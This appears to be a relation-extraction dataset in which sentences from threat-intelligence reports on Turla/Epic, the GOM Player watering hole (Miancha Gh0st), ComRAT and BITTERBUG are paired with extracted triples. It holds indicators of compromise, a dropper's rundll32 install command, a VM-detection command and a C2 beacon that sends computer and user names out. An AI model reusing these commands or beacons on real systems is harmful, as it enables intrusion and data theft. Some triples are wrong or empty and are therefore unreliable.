coupled with watering hole attacks"]}}], "\n\nThe main backdoor is about 60KB in size and implements a C&C protocol on top of normal HTTP\n\frequests": [{"implements": {"A": "implements", "S": "The main backdoor", "O": ["on top of normal HTTP requests", "a C&C protocol"]}}], "\n\nThe Turla Carbon dropper from these packages has the following properties:\n<list>\nMD5: cb1b68d9971c2353c2d6a8119c49b51f\n</list>\n\fThis is called internally by the authors \"Carbon System\", part of the \"Cobra\" project, as it can be seen from\nthe debug path inside:\n\n<figure></figure>\n\n\nThis acts as a dropper for the following modules, both 32 and 64 bit:\n<table>\n                MD5                                                     Resource number\n                4c1017de62ea4788c7c8058a8f825a2d                        101\n                43e896ede6fe025ee90f7f27c6d376a4                        102\n                e6d1dcc6c2601e592f2b03f35b06fa8f                        104\n                554450c1ecb925693fedbb9e56702646                        105\n                df230db9bddf200b24d8744ad84d80e8                        161\n                91a5594343b47462ebd6266a9c40abbe                        162\n                244505129d96be57134cb00f27d4359c                        164\n                4ae7e6011b550372d2a73ab3b4d67096                        165\n</table>\nThe Carbon system is in essence an extensible platform, very similar to other attack platforms such as the\nTilded platform or the Flame platform": [{"acts": {"A": "acts", "S": "This", "O": ["as a dropper for the following modules"]}}], "\n<figure></figure>\n</section>\n<section>\n\f<heading>Language artifacts</heading>\n\nThe payload recovered from one of the mothership servers (at\nnewsforum.servehttp[.]com/wordpress/wp-includes/css/img/upload.php, MD5:\n4dc22c1695d1f275c3b6e503a1b171f5, Compiled: Thu Sep 06 14:09:55 2012) contains two modules, a\nloader/injector and a backdoor": [{"contains": {"A": "contains", "S": "The payload", "O": ["a loader/injector"]}}], " All further\ninformation sent to the C&C is encrypted with a public key framework, making decryption impossible": [{"is encrypted": {"A": "is encrypted", "O": ["All further information", "with a public key framework"]}, "sent": {"A": "sent", "O": ["All further information", "to the C&C"]}}], " Sometimes, both backdoors are run in tandem, and used to \"rescue\" each other if\ncommunications are lost with one of the backdoors": [{"are run": {"A": "are run", "O": ["in tandem", "both backdoors"]}}], " The\ncommands from the C&C are encrypted in a simpler manner and can be decrypted if intercepted because\nthe secret key is hardcoded in the malware": [{"are encrypted": {"A": "are encrypted", "O": ["The commands from the C&C"]}}], " Depending on the\n\"tasks\", they will decide whether to infect the visitors or not": [{"decide": {"A": "decide", "S": "they", "O": ["whether to infect the visitors or not"]}}], " Contact: intelreports@kaspersky.com\n</section>\n<section>\n<heading>The Epic Turla attacks</heading>\n\nThe attacks in this campaign fall into several different categories depending on the vector used in the\ninitial compromise:\n<list>\n\n      Spearphishing e-mails with Adobe PDF exploits (CVE-2013-3346 + CVE-2013-5065)\n\f      Social engineering to trick the user into running malware installers with \".SCR\" extension,\n      sometimes packed with RAR\n      Watering hole attacks using Java exploits (CVE-2012-1723), Flash exploits (unknown) or Internet\n      Explorer 6,7,8 exploits (unknown)\n      Watering hole attacks that rely on social engineering to trick the user into running fake \"Flash\n      Player\" malware installers\n</list>\nThe attackers use both direct spearphishing and watering hole attacks to infect their victims": [{"use": {"A": "use", "S": "The attackers", "O": ["to infect their victims", "both direct spearphishing and watering hole attacks"]}}], "\n\nInjected websites load a remote JavaScript into the victim's browser:\n<figure></figure>\n\fThe script \"sitenavigatoin.js\" is a Pinlady-style browser and plugin detection script, which in turn,\nredirects to a PHP script sometimes called main.php or wreq.php": [{"load": {"A": "load", "S": "Injected websites", "O": ["a remote JavaScript", "into the victim's browser"]}}], "\nThere are three possible values:\n<list>\n      TRY\n      DON'T TRY -> Version of the browser and OS does not meet the conditions\n      DON'T TRY -> (2012-09-19 10:02:04) - checktime < 60\n</list>\nThese are the \"don't meet the conditions\" reasons observed in the logs:\n<list>\n      Windows 7 or 2008 R2\n      MSIE 8.0\n      Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR\n      2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.1.4322; .NET4.0C; .NET4.0E)\n      Adobe Shockwave 11.5.1.601\n      Adobe Flash 10.3.181.14\n      Adobe Reader 10.1.0.0\n      Win Media Player 12.0.7601.17514\n      Quick Time null\n      MS Word null\n      Java null\n</list>\n</section>\n<section>\n<heading>The Epic / Tavdig / Wipbot backdoor</heading>\n\nFor this first stage of the attack, the threat actor uses a custom backdoor": [{"uses": {"A": "uses", "S": "the threat actor", "O": ["a custom backdoor"]}}], "\n\nOne such tool observed in the attacks and saved as \"C:\\Documents and Settings\\All users\\Start\nMenu\\Programs\\Startup\\winsvclg.exe\" is:\n<list>\nName: winsvclg.exe\nMD5: a3cbf6179d437909eb532b7319b3dafe\nCompiled: Tue Oct 02 13:51:50 2012\n</list>\nThis is a keylogger tool that creates %temp%\\~DFD3O8.tmp": [{"is": {"A": "is", "S": "This", "O": ["a keylogger tool"]}}], "\n\nOne version of this script attempts to exploit Internet Explorer versions 6, 7 and 8:\n<figure></figure>\n\f<caption>Internet Explorer exploitation script</caption>\n\nUnfortunately, the Internet Explorer exploits have not yet been retrieved": [{"exploit": {"A": "exploit", "S": "One version of this script", "O": ["Internet Explorer versions 6, 7 and 8"]}}], "\n\nOther packages delivered to the victims include:\n<list>\nMD5: c7617251d523f3bc4189d53df1985ca9\nMD5: 0f76ef2e6572befdc2ca1ca2ab15e5a1\n</list>\nThese top level packages deploy both updated Epic backdoors and Turla Carbon system backdoors to\nconfirmed victims, effectively linking the Epic and Turla Carbon operations together": [{"deploy": {"A": "deploy", "S": "These top level packages", "O": ["both updated Epic backdoors and Turla Carbon system backdoors", "to confirmed victims"]}}], "\n\nOnce the attackers obtain the necessary credentials without the victim noticing, they deploy the rootkit\nand other extreme persistence mechanisms": [{"obtain": {"A": "obtain", "S": "the attackers", "O": ["the necessary credentials", "without the victim noticing"]}}, {"deploy": {"A": "deploy", "S": "they", "O": ["the rootkit and other extreme persistence mechanisms"]}}], " In February 2014 we observed the Miniduke threat actor using the same backdoor\non their hacked servers, although using a much stronger password": [{"using": {"A": "using", "S": "the Miniduke threat actor", "O": ["the same backdoor", "on their hacked servers"]}}], " These include\nsearches for:\n<list>\n      *NATO*.msg\n      eu energy dialogue*.*\n      EU*.msg\n\f      Budapest*.msg\n</list>\n\nIn this case, the attackers were interested to find e-mails related to \"NATO\", \"Energy Dialogue within\nEuropean Unition\" and so on": [{"find": {"A": "find", "S": "the attackers", "O": ["e-mails related to \"NATO\", \"Energy Dialogue within European Unition\" and so on"]}}], " This drops the malicious file with the\nMD5 7731d42b043865559258464fe1c98513": [{"drops": {"A": "drops", "S": "This", "O": ["the malicious file with the MD5 7731d42b043865559258464fe1c98513"]}}], " Our analysis indicates that\nvictims are infected via a sophisticated multi-stage attack, which begins with the Epic Turla": [{"are infected": {"A": "are infected", "O": ["victims", "via a sophisticated multi-stage attack"]}}], " In some cases, the backdoor is\npackaged together with the CVE-2013-5065 EoP exploit and heavily obfuscated": [{"obfuscated": {"A": "obfuscated", "O": ["the backdoor"]}}], " The main\nimplant code is referred to as \u767d\u52a0\u9ed1 (\u2018Black on White\u2019), a term used in the PRC hacking\ncommunity to denote the act of Antivirus avoidance through the loading of malicious\n\u2018black\u2019 code via non-malicious or trusted \u2018white\u2018 code": [{"denote": {"A": "denote", "S": "a term used in the PRC hacking community", "O": ["the act of Antivirus avoidance through the loading of malicious \u2018black\u2019 code via non-malicious or trusted \u2018white\u2018 code"]}}, {}], " The installer is responsible for the malware persistence\nmechanism, adding entries to the registry in the following locations, depending on\nWindows Version:\n<table>\nMiancha Persistence Registry Keys\nWindows Vista and later                     HKEY_USERS\\.default\\Software\\Classes\\CLSID\\{ECD4FC4D-\n                                            5213-11D0-B792-00A0C90312E1}\\InProcServer32\\@ =\n                                            expand:\"C:\\WINDOWS\\temp\\install.ocx\"\nPrior to Windows Vista                      HKEY_USERS\\.default\\Software\\Classes\\CLSID\\{B12AE898-\n                                            D056-4378-A844-6D393FE37956}\\InProcServer32\\@ =\n                                            expand:\"C:\\WINDOWS\\temp\\install.ocx\"\n</table>\nThe installer will also determine the system architecture (32- or 64-bit) and then\ndeobfuscate the relevant loader DLL to the path \u2018C:\\Windows\\temp\\install.ocx\u2019,\nensuring the malware is launched on system start-up": [{"ensuring": {"A": "ensuring", "S": "The installer", "O": ["the malware is launched on system start-up"]}, "determine": {"A": "determine", "S": "The installer", "O": ["the system architecture (32- or 64-bit)"]}, "deobfuscate": {"A": "deobfuscate", "S": "The installer", "O": ["the relevant loader DLL to the path \u2018C:\\Windows\\temp\\install.ocx\u2019"]}}, {"is": {"A": "is", "S": "The installer", "O": ["responsible for the malware persistence mechanism"]}, "adding": {"A": "adding", "S": "The installer", "O": ["to the registry", "entries", "in the following locations"]}}], "\n\nThe installer component is referred to by the author as \u2018miansha' which, according to an\nEast Asia Cyber Threat Intelligence Researcher, is likely Mi\u01censh\u0101 (\u514d\u6740), a phrase\ncommonly used by People\u2019s Republic of China (PRC) hackers to mean \u2018anti Antivirus\ndetection\u2019 or \u2018Antivirus avoidance\u2019; Symantec<fn>[3]</fn> have named the detection for this\ncode \u2018Backdoor.Miancha\u2019, where Mi\u01cench\u00e1 (\u514d\u67e5, likely shorthand for \u514d\u6740\u67e5) similarly\nmeans \u2018Antivirus avoidance\u2019": [{"mean": {"A": "mean", "S": "a phrase commonly used by People\u2019s Republic of China (PRC) hackers", "O": ["\u2018anti Antivirus detection\u2019 or \u2018Antivirus avoidance\u2019"]}}, {"similarly means": {"A": "similarly means", "S": "Mi\u01cench\u00e1 (\u514d\u67e5, likely shorthand for \u514d\u6740\u67e5)", "O": ["\u2018Antivirus avoidance\u2019"]}}, {}], "\nThis specific variant shows similarities to that used during the VOHO campaign<fn>[4]</fn>, where\nGh0st RAT was spread via watering hole attacks utilising vulnerable websites belonging\nto financial services and technology companies": [{"was spread": {"A": "was spread", "S": "Gh0st RAT", "O": ["via watering hole attacks utilising vulnerable websites belonging to financial services and technology companies"]}}], "\n</section>\n\n\n\n                             <footer>   TLP: WHITE                                        Page 4 / 11</footer>\n\f                     <header>TLP: WHITE</header>\n\n\n<section>\n<heading>\n3 The Monju Incident\n</heading>\n</section>\n<section>\n<heading>3.1 Infection Vector</heading>\nBased on open source reporting, it appears that the intrusion took place via the\ncompromise of the GOM Player update server (app.gomlab.com), where attackers\nmay have gained entry via a PHP-based webshell, hidden within an image, present on\nthe host since October 2011<fn>[2]</fn>": [{"gained": {"A": "gained", "S": "attackers", "O": ["entry", "via a PHP-based webshell"]}, "compromise": {"A": "compromise", "S": "attackers", "O": ["the GOM Player update server (app.gomlab.com)"]}}], "\nAmong other items, staff training documents and more than 40,000 emails were stored\non the machine and thought to be harvested by the attacker": [{"harvested": {"A": "harvested", "S": "the attacker", "O": ["Among other items, staff training documents and more than 40,000 emails"]}}], " The loader, referred to by the malware author as \u58f3 (shell),\nreads and deobfuscates the main implant code which then communicates with the\nattacker-controlled server at testqweasd.tk (211.43.220.89) on TCP port 443": [{"communicates": {"A": "communicates", "S": "the main implant code", "O": ["on TCP port 443", "with the attacker-controlled server at testqweasd.tk (211.43.220.89)"]}}, {"reads": {"A": "reads", "S": "The loader"}, "deobfuscates": {"A": "deobfuscates", "S": "The loader"}}], " This is a practice recently\nillustrated through the deployment of the PlugX trojan, utilising DLL load order hijacking\nalongside a signed (trusted) executable": [{"hijacking": {"A": "hijacking", "S": "DLL load order", "O": ["alongside a signed (trusted) executable"]}}], "\n\nThe attack appears to have been the result of the attackers having compromised the\n\u2018GOM Player\u2019 update server and having it act as a \u2018watering hole\u2019, meaning that\nmachines which access the site are delivered malware": [{"compromised": {"A": "compromised", "S": "the attackers", "O": ["the \u2018GOM Player\u2019 update server"]}}, {"act as": {"A": "act as", "S": "it", "O": ["a \u2018watering hole\u2019"]}}, {"are delivered": {"A": "are delivered", "O": ["machines which access the site", "malware"]}}], "\n<figure>\n                                                Repackaged Update\n           GoMPLAYERJPSETUP.EXE (a9225e059d9dace1b259bceec7f48dae)\n\n\n\n\n                                       Real GOM Player Installer        Self-extracting RAR Archive containing Malware\n    GOMPLAYERJPSETUP_JP.EXE (1ff3b3628e40f0215afacf482ba17782)          GOMPLAYERBETASETUP_JP.exe (db79a93448acac8786581858f3edc36a)\n\n\n\n\n                                           Obfuscated Malware Loaders\n                                                                               Malicious Installer\n                          dll.tmp (d5548e1913950a42a04debcac4222bd2)\n                                                                               install.exe (0ae82fd94836815a1e8d284ccb75109d)\n                       dll64.tmp (01f7b465242237bd3d31d39767aa68e0)\n\n                                                                         Obfuscated Implant Code\n                                                                         instructions.pdf (569071c45f47b7fb7a75f30bc07d5739)\n                                                                         instructions64.pdf (55474f8e26f2b6fc3b5d78ce9a77b0b0)\n\n\n                                          The deployment chain of the Miancha Gh0st variant\n\n\n</figure>\n<footnote>\n3   http://www.symantec.com/security_response/writeup.jsp?docid=2014-012407-3922-99\n\n</footnote>                                         \n                                         <footer>   TLP: WHITE                                        Page 6 / 11</footer>\n\f                     <header>TLP: WHITE</header>\n\n\n\n\nThe main implant code is stored in files named instructions.pdf and instructions64.pdf;\nnot PDF documents but instead DLLs obfuscated with a one-byte XOR with 0x14, similar\nto the malware loader DLLs": [{"obfuscated": {"A": "obfuscated", "O": ["with a one-byte XOR with 0x14", "DLLs"]}}], "\n\nThe modified file redirected the GOM Player update process to another compromised\nserver (www.fudousankaitori.jp (203.189.101.35)), where a file containing both the\nlegitimate update and the malware was deliver to the victim": [{"was deliver": {"A": "was deliver", "O": ["to the victim", "a file containing both the legitimate update and the malware"]}}], "\n\n\n<figure>\n\n                                                                      Modified\n                                                                     Update URL\n                                                                                                      app.gomlab.com\n                                                        GOM Player\n                                                       Upd ate Requ est\n\n\n                               1\n                                                GOM Update\n\n                                     2        Download Request\n\n\n                                                                                  GOM Player and\n                                                                                    Malware\n\n          Victim                          3                                                        www.fudousankaitori.jp\n\n\n                                                              Malware Command\n                                                                 And Control\n       Key\n\n\n               Compromised Server\n\n\n               Attacker Infrastructure                                                                 testqweasd.tk\n\n\n</figure>\n<caption>\n     A diagram illustrating the modified flow of the GOM Player update process which led to the compromise\n</caption>\n\n\n<footnote>\n2   http://hummingbird.tistory.com/5187\n</footnote>\n</section>\n                                         <footer>   TLP: WHITE                                        Page 5 / 11</footer>\n\f                     <header>TLP: WHITE</header>\n\n\n\n<section>\n<heading>3.2 Malware</heading>\n</section>\n<section>\n<heading>3.2.1 Overview</heading>\n\nDeployed to the system via a compressed bundle containing the official GOM Player\nsetup binary and a self-extracting RAR archive containing the malicious files, the\nmalware consists of a number of individual pieces": [{"Deployed": {"A": "Deployed", "O": ["the malware", "to the system", "via a compressed bundle containing the official GOM Player setup binary and a self-extracting RAR archive containing the malicious files"]}}], "\n\nIn addition to delivering system-specific details back to the attacker, Gh0st RAT provides\nthe capability to deploy additional malware, enabling the harvesting of sensitive data\nand enabling the further propagation throughout the infected network": [{"delivering": {"A": "delivering", "S": "Gh0st RAT", "O": ["system-specific details", "back to the attacker"]}, "deploy": {"A": "deploy", "S": "Gh0st RAT", "O": ["additional malware"]}}, {"harvesting": {"A": "harvesting", "S": "additional malware", "O": ["sensitive data"]}, "enabling": {"A": "enabling", "S": "additional malware", "O": ["the further propagation throughout the infected network"]}}], " Upon extraction from the RAR\narchive, the installer component (0ae82fd94836815a1e8d284ccb75109d) is\nautomatically launched alongside the GOM Player update, distracting victims from the\nmalicious activity taking place": [{"is automatically launched": {"A": "is automatically launched", "O": ["the installer component (0ae82fd94836815a1e8d284ccb75109d)", "alongside the GOM Player update"]}}], "\n\nThe observed malicious activity relates to the modification of a file that controls GOM\nPlayer updates, spanning the date range 27th December 2013 to 16th January 2014,\nduring which time these alterations are reported to have only manifested themselves for\nvisitors on certain IP ranges; evidence supporting this claim has not yet been made\npublic": [{"manifested": {"A": "manifested", "S": "these alterations", "O": ["themselves", "for visitors on certain IP ranges"]}}], "\n\nTechnical analysis of the implant on the compromised machine has shown it to be a\nvariant of a Trojan which has been in the wild for some years now and continues to be\neffective": [{"be": {"A": "be", "S": "it", "O": ["a variant of a Trojan"]}}], "\n      Agent.BTZ is a common RAT, a simple library executed on an infected machine": [{"is": {"A": "is", "S": "Agent.BTZ", "O": ["a common RAT"]}}], " The\ncommunication between the processes is performed by named pipe": [{"is performed": {"A": "is performed", "S": "named pipe", "O": ["The communication between the processes"]}}], "\n</section>\n<section>\n<heading>Execution flow and features</heading>\n\nDuring the startup of the infected machine, the shdocvw.tlp library is loaded into all processes": [{"is loaded": {"A": "is loaded", "O": ["into all processes", "the shdocvw.tlp library"]}}], " The malware is loaded into each and every process of the infected machine and the main part\n      (payload) of the malware is only executed in explorer.exe": [{"is only executed": {"A": "is only executed", "O": ["in explorer.exe", "the main part (payload) of the malware"]}}, {"is loaded": {"A": "is loaded", "O": ["into each and every process of the infected machine", "The malware"]}}], " The dropper executes the following command in order to install a second file:\n<list>\nrundll32.exe %APPDATA%\\Microsoft\\credprov.tlb,Install %APPDATA%\\Microsoft\\shdocvw.tlp\n</list>\nThe second file is shdocw.tlp": [{"install": {"A": "install", "S": "The dropper", "O": ["a second file"]}}], " Furthermore, the attackers also shared a C&C domain": [{"shared": {"A": "shared", "S": "the attackers", "O": ["a C&C domain"]}}], "\n</list>\n\fComRAT\u2019s communication to the command and control server is performed by the browser process and not by\nexplorer.exe in order to avoid being blocked by a firewall on the system or any additional security products": [{"is performed": {"A": "is performed", "S": "the browser process", "O": ["ComRAT\u2019s communication to the command and control server"]}}, {"avoid": {"A": "avoid", "O": ["being blocked by a firewall on the system or any additional security products"]}}], " The command and control server information is\nstored in the registry, not in an XML, and encoded:\n<list>\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SessionMRU\\IPlace\n</list>\nFor example, in the analyzed sample the CC is: weather-online.hopto.org": [{"is stored": {"A": "is stored", "O": ["in the registry", "The command and control server information"]}}], " The purpose is to load the library into each and every process\nexecuted on the infected system": [{"load": {"A": "load", "O": ["the library", "into each and every process executed on the infected system"]}}], "\n      Command and control server domains are shared between Uroburos and ComRAT": [{"are shared": {"A": "are shared", "O": ["between Uroburos and ComRAT", "Command and control server domains"]}}], "\n\nAnother very interesting fact: the attackers use COM Object hijacking, the same persistence mechanism as\nCOMpfun, which we described recently": [{"use": {"A": "use", "S": "the attackers", "O": ["the same persistence mechanism"]}}], " The file is xored with the\nfollowing obfuscation key (used by both, Uroburos and Agent.BTZ):\n<list>\n1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s\n</list>\nHere is the decoded log file content:\n<list>\nuser1@gdata$ ./decode.py winview.ocx\nLog begin: 06.11.2014 22:55:55\nTVer=2.2\n06.11.2014 22:55:55 TVer=2.3\n06.11.2014 22:55:55 CFG: CFG_4\n06.11.2014 22:55:55 User: user1\n06.11.2014 22:55:55 Machine: x86\n06.11.2014 22:55:55 Removing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\shdocvw.tlb [2]\n06.11.2014 22:55:55 Removing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\oleaut32.dll [2]\n06.11.2014 22:55:55 Removing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\oleaut32.tlb [2]\n06.11.2014 22:55:55 Removing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\credprov.tlb [2]\n06.11.2014 22:55:55 Removing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\libadcodec.dll [2]\n06.11.2014 22:55:55 Removing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\libadcodec.tlb [2]\n06.11.2014 22:55:55 Writing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\shdocvw.tlb 51200B\nOk\n06.11.2014 22:55:56 Writing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\credprov.tlb\n260096B Ok\n06.11.2014 22:55:57 Exit code1 0\n06.11.2014 22:55:57 Writing 3072B Ok\n</list>\nWe can notice that the malware checks if an older version is installed on the system and if this is the case, the\ndropper removes the older version": [{"is xored": {"A": "is xored", "O": ["with the following obfuscation key", "The file"]}}, {"checks": {"A": "checks", "S": "the malware", "O": ["if an older version is installed on the system"]}}, {"removes": {"A": "removes", "S": "the dropper", "O": ["the older version"]}}], " In contrast to this, in our Uroburos analysis, we found out that Uroburos does\nnot install itself in case a version of Agent.BTZ was found on a system": [{"was found": {"A": "was found", "S": "Uroburos", "O": ["a version of Agent.BTZ", "on a system"]}, "does not install": {"A": "does not install", "S": "Uroburos", "O": ["itself"]}}], " Furthermore, the C&C communication blends into\n      the usual browser traffic and the malware communicates to the browser by named pipe": [{"blends": {"A": "blends", "S": "the C&C communication", "O": ["into the usual browser traffic"]}}, {"communicates": {"A": "communicates", "S": "the malware", "O": ["to the browser", "by named pipe"]}}], " The\nlatest version of ComRAT known to us (v3.26) uses a new key and does not create the installation log file, in order to\ncomplicate the analysis and to disguise the link between the two cases": [{"complicate": {"A": "complicate", "S": "ComRAT", "O": ["the analysis"]}}], " If the process is\nexplorer.exe, this library will load the other library called credprov.tlb": [{"will load": {"A": "will load", "S": "this library", "O": ["the other library called credprov.tlb"]}}], "\n</section>\n<section>\n<heading>Persistence</heading>\n\nTo be started during the boot process of the infected machine, the malware creates the following registry key:\n<list>\nHKCU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32 =\n%APPDATA%\\shdocvw.tlp\n</list>\nThis registry key is used to associate the library shdocvw.tlp to the object 42aedc87-2188-41fd-b9a3-0c966feabec1\nas previously explained in the article about COMpfun": [{"creates": {"A": "creates", "S": "the malware", "O": ["the following registry key"]}, "started": {"A": "started", "S": "the malware", "O": ["during the boot process of the infected machine"]}}], "\n</section>\n<section>\n<heading>Log files</heading>\n\nTwo log files are created during the malware execution: mskfp32.ocx and msvcrtd.tlb": [{"are created": {"A": "are created", "O": ["Two log files", "during the malware execution"]}}, {}], "\nIf the malware version in lower than 3.26, the XML log file contains the command and control server information:\n<list>\n\f[\u2026]\n<add ke=\"IsAdmin\" value=\"1\" />\n<add key=\"Http address\" value=\"webonline.mefound.com\" />\n<add key=\"Http address\" value=\"sportacademy.my03.com\" />\n<add key=\"Http address2\" value=\"easport-news.publicvm.com\" />\n<add key=\"Http address2\" value=\"new-book.linkpc.net\" />\n<add key=\"Http idx1\" value=\"4294967295\" />\n[\u2026]\n</list>\n</section>\n<section>\n<heading>Summary</heading>\n\nLet us summarize the similarities and differences between Agent.BTZ, Uroburos and ComRAT as far as we can:\n<list>\nSimilarities:\nBefore version 3.26:\n\n      use of the same xor key\n      use of the same file name for the log\n\n\n\nOn all versions:\n</list>\n      Some parts of the code are exactly the same (appears to be copy & paste)": [{"contains": {"A": "contains", "S": "the XML log file", "O": ["the command and control server information"]}}], " We suspect that\nthis date is spoofed in order to disguise that this is in fact a newer version": [{"is spoofed": {"A": "is spoofed", "O": ["this date"]}}], "\n</section>\n<section>\n\f<heading>Dropper\u2019s log file</heading>\n\nIf the version of the malware is older than 3.26, the dropper creates an additional file called winview.ocx": [{"creates": {"A": "creates", "S": "the dropper", "O": ["an additional file called winview.ocx"]}}], "\n</section>\n<section>\n<heading>File installation</heading>\n\nThe first task of the malware is to install the file credprov.tlb in %APPDATA%\\Microsoft\\": [{"install": {"A": "install", "S": "the malware", "O": ["in %APPDATA%\\Microsoft\\", "the file credprov.tlb"]}}], " Though many of the samples that we have observed use direct IPs for HTTP communications, we have\nobserved more limited use of a No-IP domain": [{"observed": {"A": "observed", "S": "we", "O": ["more limited use of a No-IP domain"]}}, {"use": {"A": "use", "S": "many of the samples that we have observed", "O": ["for HTTP communications", "direct IPs"]}}], " Interestingly, this SFXRAR's filename was the only lure element related to the MH370 event; it did not contain a decoy document": [{"was": {"A": "was", "S": "this SFXRAR's filename", "O": ["the only lure element related to the MH370 event"]}}], " The debug path of \"umairaziz27\" led us to Twitter<fn>42</fn> and LinkedIn<fn>43</fn> accounts (on which a matching alias is used) that belong to a Tranchulas employee named Umair Aziz, who identified himself as an Information Security Analyst<fn>44</fn> and graduate of National University of Sciences and Technology<fn>45</fn> (NUST).<fn>46</fn> One of these samples was probably used in attacks in late summer 2013, using a \"leaked report\" lure which contained a decoy document related to Pakistan's alleged inability to locate Osama Bin Laden": [{"using": {"A": "using", "S": "One of these samples", "O": ["a \"leaked report\" lure which contained a decoy document related to Pakistan's alleged inability to locate Osama Bin Laden"]}}], " Many of the notable characteristics of the BITTERBUG activity suggest that this is indeed\npart of a Pakistan-based cyber exploitation effort that has apparently attempted to obfuscate its malware characteristics and\norigins (behind U.S": [{"obfuscate": {"A": "obfuscate", "S": "a Pakistan-based cyber exploitation effort", "O": ["its malware characteristics"]}}], "\n\n\n<figure>\n               POST /path_active.php?compname=<%COMPUTERNAME%>_<%USERNAME%> HTTP/1.1\n               Host: <c2_location>\n               Accept: */*\n               Content-Length: 25\n               Content-Type: application/x-www-form-urlencoded\n               <%COMPUTERNAME%>_<%USERNAME%>\n</figure>\n                 <caption>                        Figure 14: Initial C2 beacon</caption>\n\n\n\n\n<footer>13  \u2022     OPERATION ARACHNOPHOBIA</footer>\n\fBITTERBUG then may perform an HTTP GET request for the following URI:\n<list>\nhttp://<c2_location>/checkpkg.php?compname=<%COMPUTERNAME%>_<%USERNAME%>\n</list>\nIf the C2 server responds with a filename, the filename received is deleted from %APPDATA%\\Microsoft<FILE_NAME_FROM_\nC2>": [{"perform": {"A": "perform", "S": "BITTERBUG", "O": ["an HTTP GET request for the following URI"]}}, {"is deleted": {"A": "is deleted", "O": ["from %APPDATA%\\Microsoft<FILE_NAME_FROM_ C2>", "the filename received"]}}], " To our knowledge this customized malware\nhas only ever been observed hosted on and communicating with two command and control nodes: 199.91.173.43<fn>1</fn> and\n199.91.173.45.<fn>2</fn> <fn>3</fn> According to Whois records, those IP addresses were registered to a web-hosting firm in Kansas City,\nMissouri": [{"communicating": {"A": "communicating", "S": "this customized malware"}, "hosted": {"A": "hosted", "S": "this customized malware"}}], "\n</section>\n<section>\n<heading>Inconsistency #5: Similar Document Metadata Properties</heading>\nAnalysis of metadata within two benign decoy documents that were originally used within July 2013 BITTERBUG operations,\nReport.docx<fn>58</fn> and Naxalites_Funded_by_Pakistan.docx<fn>59</fn>, both maintained the author properties of \u201chp\u201d": [{"were originally used": {"A": "were originally used", "O": ["two benign decoy documents", "within July 2013 BITTERBUG operations"]}}], "\n\n\n<figure></figure>\n\n            <caption>       Figure 13: Example recovery.txt file from VMware virtual machine</caption>\n\n\nNext BITTERBUG typically will beacon to the C2 server by sending the computer name and username of the compromised\nsystem": [{"beacon": {"A": "beacon", "S": "BITTERBUG", "O": ["to the C2 server", "by sending the computer name and username of the compromised system"]}}], "\n\n\n<figure></figure>\n\n                 <caption>   Timeline of BITTERBUG characteristics vs.ThreatConnect events</caption>\n</section>\n\n\n\n<footer>12  \u2022     OPERATION ARACHNOPHOBIA</footer>\n\n\f\n<section>\n<heading>Details</heading>\nUpon execution the self-extracting RAR may install <BITTERBUG>.exe and the following DLLs:\n<list>\n\u2022\t libcurld.dll \u2013 Used for downloading and uploading files\n\n\u2022\t msvcm90d.dll \u2013 C runtime library\n\n\u2022\t msvcp90d.dll \u2013 C runtime library\n\n\u2022\t msvcr90d.dll \u2013 C runtime library\n</list>\nThe self-extracting RAR may install the following benign configuration files:\n<list>\n\u2022\t Microsoft.VC90.DebugCRT.manifest \u2013 Compilation artifact\n\n\u2022\t BtcirEt.DZU \u2013 Self-extracting RAR configuration file\n\n\u2022\t SJeXSrA.KNX \u2013 Self-extracting RAR configuration file\n\n\u2022\t VCAKSQl.TNT \u2013 Self-extracting RAR configuration file\n</list>\nBITTERBUG first may execute the following Windows Management Instrumentation (WMI) command to detect the presence of a\nvirtual machine (VM):\n<list>\n\u2022\t cmd.exe /c wmic diskdrive list brief >\n  \u201c%APPDATA%\\Microsoft\\recovery.txt\u201d\n</list>\nBITTERBUG then may open recovery.txt and check for the presence of strings VBox or VMware": [{"open": {"A": "open", "S": "BITTERBUG", "O": ["recovery.txt"]}, "check": {"A": "check", "S": "BITTERBUG", "O": ["for the presence of strings VBox or VMware"]}}, {"execute": {"A": "execute", "S": "BITTERBUG", "O": ["to detect the presence of a virtual machine (VM)", "the following Windows Management Instrumentation (WMI) command"]}}, {"install": {"A": "install", "S": "the self-extracting RAR", "O": ["<BITTERBUG>.exe and the following DLLs"]}}, {"install": {"A": "install", "S": "The self-extracting RAR", "O": ["the following benign configuration files"]}}], "\n\n<table>\n                           Request URI                                                    Download Path\n\n      http://<c2_location>/versionchk.php?srs=436712384                            %APPDATA%\\Microsoft\\file.exe\n\n           http://<c2_location>/vtris.php?srs=436712384                         %APPDATA%\\Microsoft\\percf001.dat\n\n          http://<c2_location>/vtris1.php?srs=436712384                         %APPDATA%\\Microsoft\\percf002.dat\n\n      http://<c2_location>/is_array_max.php?compname=                         %USERPROFILE%\\Start Menu\\Programs\\\n           <%COMPUTERNAME%>_<%USERNAME%>                                                Startup\\wincheck.exe\n\n         http://<c2_location>/is_array_pal.php?compname=                      %USERPROFILE%\\Start Menu\\Programs\\\n           <%COMPUTERNAME%>_<%USERNAME%>                                                 Startup\\winsquirt.exe\n</table>\n       <caption>                       Table 1: Files downloaded by the backdoor</caption>\n\n\nNext, BITTERBUG may scan through each drive letter and search recursively for files with the following file extensions: \n<list>\n.doc, .ppt, .xls, .pdf, .docx, .pptx, .pps, .xlsx\n</list>\nBITTERBUG then typically creates a file list containing all documents (excluding those whose filename contains MediaUtils) to\nthe following locations:\n<list>\n\u2022\t %APPDATA%\\Microsoft\\plang006.txt\n\u2022\t 